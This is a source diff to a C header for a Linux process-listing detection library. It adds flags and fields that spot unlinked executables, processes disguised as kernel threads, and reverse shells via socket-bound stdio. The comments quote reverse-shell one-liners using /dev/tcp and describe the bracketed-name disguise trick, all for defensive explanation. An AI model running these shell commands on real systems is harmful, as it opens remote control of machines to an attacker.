@@ -250,7 +250,92 @@ enum {
 	 * runtimes, and systemd's own sealed-file handling. Rare enough to be
 	 * worth looking at every time; not rare enough to be a verdict.
 	 */
-	KOFA_PF_EXE_MEMFD = 1u << 3
+	KOFA_PF_EXE_MEMFD = 1u << 3,
+
+	/*
+	 * THE EXECUTABLE WAS UNLINKED AND NOTHING HAS TAKEN ITS PLACE.
+	 *
+	 * KOFA_PF_EXE_GONE on its own is ambiguous and mostly boring: every
+	 * package upgrade leaves every still-running process pointing at a
+	 * deleted inode, and a desktop has dozens at any moment. The thing
+	 * that separates the dropper from the upgrade is whether the PATH
+	 * still resolves - an upgrade replaces the file, so the name comes
+	 * back immediately; a program that unlinked itself leaves nothing
+	 * there at all.
+	 *
+	 * One access() on a path this walk has already read, so it costs a
+	 * stat per deleted-exe process and nothing for the rest.
+	 *
+	 * STILL NOT A VERDICT: a build directory cleaned while a test binary
+	 * is running looks exactly like this. It is the difference between
+	 * "dozens per desktop" and "worth reading the next line about".
+	 */
+	KOFA_PF_EXE_UNLINKED = 1u << 4,
+
+	/*
+	 * A USERLAND PROCESS WEARING A KERNEL THREAD'S NAME: comm is
+	 * "[something]" and PF_KTHREAD is not set.
+	 *
+	 * ps renders kernel threads in brackets, so a process that names
+	 * ITSELF "[kworker/0:2]" disappears into a list of forty real ones.
+	 * It is a standard trick and it costs an attacker one prctl call.
+	 *
+	 * IT IS DETECTABLE HERE BY CONSTRUCTION, and that is worth saying
+	 * because it is an accident of an earlier decision rather than a
+	 * feature anybody designed. This walk classifies kernel threads from
+	 * PF_KTHREAD in field 9 of /proc/<pid>/stat - the kernel's own bit -
+	 * and never from the name, because the name was never trustworthy for
+	 * anything. So the disagreement between what the process CALLS itself
+	 * and what the kernel SAYS it is falls out for free, and there is no
+	 * way to spell the name that avoids it.
+	 *
+	 * A real kernel thread never sets this: it has PF_KTHREAD, so the two
+	 * agree. The false positive left is a program that legitimately
+	 * brackets its own name, which exists but is rare enough to read.
+	 */
+	KOFA_PF_FAKE_KTHREAD = 1u << 5,
+
+	/*
+	 * ONE OF stdin, stdout OR stderr IS A SOCKET.
+	 *
+	 * The shape of a reverse shell, and the reason it is worth a flag of
+	 * its own rather than a signature: `bash -i >& /dev/tcp/host/port 0>&1`
+	 * writes no file, loads no module, and contains no byte a scanner
+	 * could match - what it DOES is put a socket where a terminal goes.
+	 * So does every python, perl, nc and socat variant of the same thing,
+	 * which is why this catches the technique rather than the tool.
+	 *
+	 * NOT A VERDICT AND GENUINELY COMMON. Measured on the development
+	 * desktop: EIGHT processes carry this at rest, every one of them
+	 * legitimate - VS Code's language servers, its extension hosts, and
+	 * this tree's own agent - because modern desktop IPC is sockets and
+	 * those children are spawned with the socket already on their stdio.
+	 * Every network daemon that forks a worker per connection does the
+	 * same, and so does anything a socket-activated systemd unit starts.
+	 *
+	 * SO THE FLAG ALONE IS NOT THE FINDING, AND THE MEASUREMENT SAYS WHAT
+	 * IS. A controlled `bash -i >& /dev/tcp/127.0.0.1/48231 0>&1` against
+	 * a local listener, beside the eight:
+	 *
+	 *     the eight legitimate  23..94 fds,  5..14 of them sockets
+	 *     the reverse shell        4 fds,       4 of them sockets
+	 *
+	 * A real program holds a working set of descriptors - files, epoll,
+	 * pipes, a terminal - and its sockets are a fraction of them. A shell
+	 * handed a socket for stdio holds NOTHING ELSE: the ratio is 1.0 and
+	 * the count is tiny, because nothing opened anything. That is why
+	 * n_fd and n_socket are collected beside this flag rather than the
+	 * flag being collected alone - the ratio is the signal and the flag is
+	 * only what makes it worth computing.
+	 *
+	 * The join is still the CALLER'S: this says what the descriptors are,
+	 * kofa_proc.comm and .cmdline say what the program is, and nothing
+	 * here decides that a small ratio plus a shell is malice. A container
+	 * entry point is a shell with four descriptors too.
+	 *
+	 * Costs three readlinks per process. See kofa_plist_option.no_fds.
+	 */
+	KOFA_PF_STDIO_SOCKET = 1u << 6
 };
 
 struct kofa_proc {
@@ -286,6 +371,52 @@ struct kofa_proc {
 	 */
 	const char *comm;
 	const char *exe;
+
+	/*
+	 * THE COMMAND LINE, with the NULs that separate its arguments turned
+	 * into spaces. Borrowed, "" when it could not be read.
+	 *
+	 * WHY IT IS WORTH READING HERE AND NOT LATER. /proc/<pid>/cmdline is
+	 * only readable while the process exists, and the processes worth
+	 * reading are the ones that do not last. kofw_evt carries the same
+	 * field and had to go to the new process's PEB to get it, with a race
+	 * it flags - see KOFW_EF_CMDLINE_RACED. A snapshot walk has no race
+	 * because it is not chasing a notification, but it has the same
+	 * deadline: the answer is gone when the process is.
+	 *
+	 * It earns its cost the same way it does on Windows: "bash started" is
+	 * not a fact anybody can act on, and `bash -c 'exec 5<>/dev/tcp/...'`
+	 * is the whole event. Every living-off-the-land technique looks
+	 * identical without this field.
+	 *
+	 * THE NULs ARE REPLACED AND THAT LOSES SOMETHING. Argument boundaries
+	 * are real - an argument containing a space is indistinguishable from
+	 * two arguments once this is done - and a caller that needs them back
+	 * has to read the file itself. Done anyway because every consumer here
+	 * wants one string to print or match against, and each doing the
+	 * conversion privately is four chances to disagree about the trailing
+	 * NUL. Needs kofa_plist_option.want_cmdline.
+	 */
+	const char *cmdline;
+
+	/*
+	 * WHAT ITS FILE DESCRIPTORS ARE, counted rather than listed.
+	 *
+	 * `n_fd` is how many it has open; `n_socket` how many of those are
+	 * sockets. Both zero when the walk did not ask or was refused, which
+	 * is why KOFA_PF_STDIO_SOCKET is a separate flag: a count of zero and
+	 * a question nobody asked look the same, and the flag only ever
+	 * appears when the answer was actually obtained.
+	 *
+	 * A COUNT AND NOT A LIST, because the list is unbounded - a busy
+	 * daemon holds thousands - and because the two facts a caller acts on
+	 * are "how many" and "is stdio a socket". Anything finer is a second
+	 * pass over /proc/<pid>/fd that the caller can make itself.
+	 *
+	 * Needs kofa_plist_option.want_fds.
+	 */
+	uint32_t n_fd;
+	uint32_t n_socket;
 };
 
 struct kofa_plist_option {
@@ -297,6 +428,29 @@ struct kofa_plist_option {
 	/* Report processes whose /proc entry could not be read, carrying
 	 * KOFA_PF_REFUSED. ON by default - see the flag. */
 	int want_refused;
+
+	/*
+	 * Read /proc/<pid>/cmdline. ON by default: one open and one read per
+	 * process, for the field without which the process rows say nothing.
+	 */
+	int no_cmdline;
+
+	/*
+	 * Look at /proc/<pid>/fd. ON by default.
+	 *
+	 * Three readlinks for stdin, stdout and stderr - which is what
+	 * KOFA_PF_STDIO_SOCKET needs - plus one readdir to count the rest.
+	 * The readdir is what makes this cost scale with a process's fd table
+	 * rather than being constant, so it is the half worth turning off on a
+	 * machine full of busy daemons.
+	 *
+	 * NEGATIVE SENSE, like no_cmdline above, so that a zeroed option
+	 * struct asks for everything. A caller that fills this struct field by
+	 * field and forgets one should get MORE information than it expected
+	 * and never less: the opposite default hides facts from whoever did
+	 * not know to ask, which is exactly who needs them.
+	 */
+	int no_fds;
 };
 
 struct kofa_plist;
